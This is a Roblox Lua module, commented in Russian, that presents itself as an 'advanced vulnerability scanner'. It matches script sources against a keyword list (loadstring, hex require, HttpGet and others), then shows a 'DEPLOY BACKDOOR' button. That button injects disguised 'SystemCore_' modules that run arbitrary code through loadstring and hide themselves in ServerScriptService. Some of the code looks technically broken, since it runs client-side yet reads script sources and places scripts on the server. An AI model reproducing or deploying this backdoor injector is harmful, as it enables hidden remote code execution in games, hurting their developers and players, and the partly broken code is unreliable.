-- ModuleScript в ReplicatedStorage назови "VulnerabilityScanner"
local Scanner = {}

function Scanner.Init()
    print("[Vulnerability Scanner] Initializing advanced security scan...")
    
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    
    -- Создание GUI для сканера
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "SecurityScannerGUI"
    ScreenGui.Parent = PlayerGui
    ScreenGui.ResetOnSpawn = false

    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 500, 0, 600)
    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -300)
    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Title.TextColor3 = Color3.new(1, 1, 1)
    Title.Text = "🔍 ADVANCED VULNERABILITY SCANNER"
    Title.TextSize = 16
    Title.Font = Enum.Font.GothamBold
    Title.Parent = MainFrame

    local ScanButton = Instance.new("TextButton")
    ScanButton.Size = UDim2.new(1, -20, 0, 50)
    ScanButton.Position = UDim2.new(0, 10, 0, 50)
    ScanButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    ScanButton.TextColor3 = Color3.new(1, 1, 1)
    ScanButton.Text = "🚀 START DEEP SCAN"
    ScanButton.TextSize = 14
    ScanButton.Font = Enum.Font.GothamBold
    ScanButton.Parent = MainFrame

    local StatusLabel = Instance.new("TextLabel")
    StatusLabel.Size = UDim2.new(1, -20, 0, 60)
    StatusLabel.Position = UDim2.new(0, 10, 0, 110)
    StatusLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    StatusLabel.TextColor3 = Color3.new(1, 1, 1)
    StatusLabel.Text = "Status: Ready for scanning\nTarget: Entire game\nMode: Deep analysis"
    StatusLabel.TextWrapped = true
    StatusLabel.TextSize = 12
    StatusLabel.Parent = MainFrame

    local ResultsFrame = Instance.new("ScrollingFrame")
    ResultsFrame.Size = UDim2.new(1, -20, 1, -190)
    ResultsFrame.Position = UDim2.new(0, 10, 0, 180)
    ResultsFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    ResultsFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    ResultsFrame.ScrollBarThickness = 8
    ResultsFrame.Parent = MainFrame

    local ExploitButton = Instance.new("TextButton")
    ExploitButton.Size = UDim2.new(1, -20, 0, 40)
    ExploitButton.Position = UDim2.new(0, 10, 0, 550)
    ExploitButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
    ExploitButton.TextColor3 = Color3.new(1, 1, 1)
    ExploitButton.Text = "💀 DEPLOY BACKDOOR TO VULNERABILITIES"
    ExploitButton.TextSize = 12
    ExploitButton.Visible = false
    ExploitButton.Parent = MainFrame

    -- Паттерны для поиска уязвимостей
    local vulnerabilityPatterns = {
        -- Backdoor паттерны
        {pattern = "loadstring", risk = "HIGH", type = "Code Execution"},
        {pattern = "require%(0x", risk = "CRITICAL", type = "Hex Require Backdoor"},
        {pattern = "getfenv%(%)", risk = "HIGH", type = "Environment Access"},
        {pattern = "setfenv%(%)", risk = "HIGH", type = "Environment Manipulation"},
        {pattern = "coroutine%.create", risk = "MEDIUM", type = "Async Execution"},
        {pattern = "Instance%.new%(.-Script%)", risk = "MEDIUM", type = "Dynamic Script Creation"},
        {pattern = "FireServer", risk = "LOW", type = "Remote Event"},
        {pattern = "InvokeServer", risk = "LOW", type = "Remote Function"},
        {pattern = "game%.HttpGet", risk = "HIGH", type = "HTTP Requests"},
        {pattern = "game%.HttpService", risk = "HIGH", type = "HTTP Service"},
        {pattern = "rbxassetid://", risk = "MEDIUM", type = "Asset Loading"},
        {pattern = "Backdoor", risk = "CRITICAL", type = "Explicit Backdoor"},
        {pattern = "Exploit", risk = "HIGH", type = "Exploit Code"},
        {pattern = "Hack", risk = "HIGH", type = "Hacking Tools"},
        {pattern = "Cheat", risk = "MEDIUM", type = "Cheating System"},
        {pattern = "Admin", risk = "LOW", type = "Admin System"},
        {pattern = "Fly", risk = "MEDIUM", type = "Movement Hack"},
        {pattern = "Noclip", risk = "MEDIUM", type = "Collision Bypass"},
        {pattern = "Speed", risk = "LOW", type = "Speed Hack"},
        {pattern = "Infinite", risk = "MEDIUM", type = "Infinite Resources"}
    }

    local foundVulnerabilities = {}

    -- Функция добавления результата
    local function addResult(message, riskLevel)
        local color
        if riskLevel == "CRITICAL" then
            color = Color3.fromRGB(255, 0, 0)
        elseif riskLevel == "HIGH" then
            color = Color3.fromRGB(255, 100, 0)
        elseif riskLevel == "MEDIUM" then
            color = Color3.fromRGB(255, 200, 0)
        else
            color = Color3.fromRGB(100, 200, 100)
        end

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -10, 0, 25)
        label.Position = UDim2.new(0, 5, 0, #ResultsFrame:GetChildren() * 28)
        label.BackgroundTransparency = 1
        label.Text = "[" .. riskLevel .. "] " .. message
        label.TextColor3 = color
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.Font = Enum.Font.Code
        label.TextSize = 11
        label.TextWrapped = true
        label.Parent = ResultsFrame
        
        ResultsFrame.CanvasSize = UDim2.new(0, 0, 0, #ResultsFrame:GetChildren() * 28)
    end

    -- Рекурсивное сканирование
    local function deepScan(parent, path)
        for _, child in ipairs(parent:GetChildren()) do
            local currentPath = path .. "." .. child.Name
            
            if child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript") then
                local source = child.Source
                
                for _, patternInfo in ipairs(vulnerabilityPatterns) do
                    if source:find(patternInfo.pattern) then
                        local vulnerability = {
                            Object = child,
                            Path = currentPath,
                            Type = patternInfo.type,
                            Risk = patternInfo.risk,
                            Pattern = patternInfo.pattern
                        }
                        
                        table.insert(foundVulnerabilities, vulnerability)
                        
                        addResult(
                            patternInfo.type .. " in " .. currentPath .. " (" .. patternInfo.pattern .. ")",
                            patternInfo.risk
                        )
                        
                        print("[SCANNER] Found " .. patternInfo.risk .. " vulnerability: " .. patternInfo.type .. " at " .. currentPath)
                    end
                end
            end
            
            -- Рекурсивный обход
            deepScan(child, currentPath)
        end
    end

    -- Функция внедрения backdoor
    local function deployBackdoor()
        print("[SCANNER] Deploying backdoor to vulnerabilities...")
        addResult("Starting backdoor deployment...", "CRITICAL")
        
        local deployedCount = 0
        
        for _, vuln in ipairs(foundVulnerabilities) do
            if vuln.Risk == "CRITICAL" or vuln.Risk == "HIGH" then
                -- Создаем backdoor в уязвимом месте
                local backdoorScript = Instance.new("ModuleScript")
                backdoorScript.Name = "SystemCore_" .. math.random(10000, 99999)
                
                backdoorScript.Source = [[
local Backdoor = {}

function Backdoor.Execute(cmd)
    local success, result = pcall(function()
        return loadstring(cmd)()
    end)
    return success, result
end

function Backdoor.StealthMode()
    -- Скрытый режим
    script.Parent = game:GetService("ServerScriptService")
end

-- Автоактивация
spawn(function()
    wait(5)
    Backdoor.StealthMode()
end)

return Backdoor
]]
                
                local success = pcall(function()
                    backdoorScript.Parent = vuln.Object.Parent
                    deployedCount = deployedCount + 1
                    addResult("Backdoor deployed: " .. backdoorScript.Name .. " in " .. vuln.Object.Parent:GetFullName(), "CRITICAL")
                    print("[SCANNER] Backdoor deployed: " .. backdoorScript:GetFullName())
                end)
            end
        end
        
        addResult("Backdoor deployment completed. Total: " .. deployedCount, "CRITICAL")
        StatusLabel.Text = "Status: Backdoor deployment completed\nDeployed: " .. deployedCount .. " backdoors\nSystem: Active"
    end

    -- Обработчик сканирования
    ScanButton.MouseButton1Click:Connect(function()
        ScanButton.Text = "SCANNING..."
        ScanButton.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
        StatusLabel.Text = "Status: Scanning in progress...\nPlease wait..."
        
        -- Очистка предыдущих результатов
        for _, child in ipairs(ResultsFrame:GetChildren()) do
            child:Destroy()
        end
        foundVulnerabilities = {}
        
        addResult("Starting deep vulnerability scan...", "MEDIUM")
        
        -- Сканирование основных сервисов
        local servicesToScan = {
            game:GetService("Workspace"),
            game:GetService("ReplicatedStorage"),
            game:GetService("ServerScriptService"),
            game:GetService("ServerStorage"),
            game:GetService("StarterPack"),
            game:GetService("StarterPlayer"),
            game:GetService("StarterGui"),
            game:GetService("Lighting"),
            game:GetService("SoundService"),
            game:GetService("Players")
        }
        
        for _, service in ipairs(servicesToScan) do
            addResult("Scanning: " .. service.Name, "LOW")
            deepScan(service, "game." .. service.Name)
            wait(0.1) -- Чтобы не лагать
        end
        
        -- Статистика
        local criticalCount = 0
        local highCount = 0
        local mediumCount = 0
        
        for _, vuln in ipairs(foundVulnerabilities) do
            if vuln.Risk == "CRITICAL" then
                criticalCount = criticalCount + 1
            elseif vuln.Risk == "HIGH" then
                highCount = highCount + 1
            elseif vuln.Risk == "MEDIUM" then
                mediumCount = mediumCount + 1
            end
        end
        
        addResult("=== SCAN COMPLETED ===", "MEDIUM")
        addResult("Critical vulnerabilities: " .. criticalCount, "CRITICAL")
        addResult("High vulnerabilities: " .. highCount, "HIGH")
        addResult("Medium vulnerabilities: " .. mediumCount, "MEDIUM")
        addResult("Total vulnerabilities found: " .. #foundVulnerabilities, "MEDIUM")
        
        ScanButton.Text = "🔄 RESCAN"
        ScanButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
        StatusLabel.Text = "Status: Scan completed\nCritical: " .. criticalCount .. "\nHigh: " .. highCount .. "\nTotal: " .. #foundVulnerabilities
        
        -- Показываем кнопку эксплуатации если найдены уязвимости
        if #foundVulnerabilities > 0 then
            ExploitButton.Visible = true
        end
        
        print("[SCANNER] Scan completed. Found " .. #foundVulnerabilities .. " vulnerabilities")
    end)

    -- Обработчик эксплуатации
    ExploitButton.MouseButton1Click:Connect(function()
        ExploitButton.Text = "DEPLOYING..."
        ExploitButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
        deployBackdoor()
        ExploitButton.Text = "✅ BACKDOOR DEPLOYED"
        ExploitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    end)

    -- Автоматическое сканирование при старте
    spawn(function()
        wait(3)
        addResult("Scanner initialized and ready", "LOW")
        addResult("Click START DEEP SCAN to begin", "LOW")
    end)
end

-- Функция для быстрого сканирования
function Scanner.QuickScan()
    print("[SCANNER] Starting quick scan...")
    
    local quickResults = {}
    local patterns = {"loadstring", "require%(0x", "Backdoor", "Exploit"}
    
    local function scanObject(obj, path)
        if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
            local source = obj.Source
            for _, pattern in ipairs(patterns) do
                if source:find(pattern) then
                    table.insert(quickResults, {
                        Object = obj,
                        Path = path,
                        Pattern = pattern
                    })
                    print("[QUICK SCAN] Found " .. pattern .. " in " .. path)
                end
            end
        end
        
        for _, child in ipairs(obj:GetChildren()) do
            scanObject(child, path .. "." .. child.Name)
        end
    end
    
    scanObject(game:GetService("ReplicatedStorage"), "game.ReplicatedStorage")
    scanObject(game:GetService("ServerScriptService"), "game.ServerScriptService")
    
    return quickResults
end

return Scanner
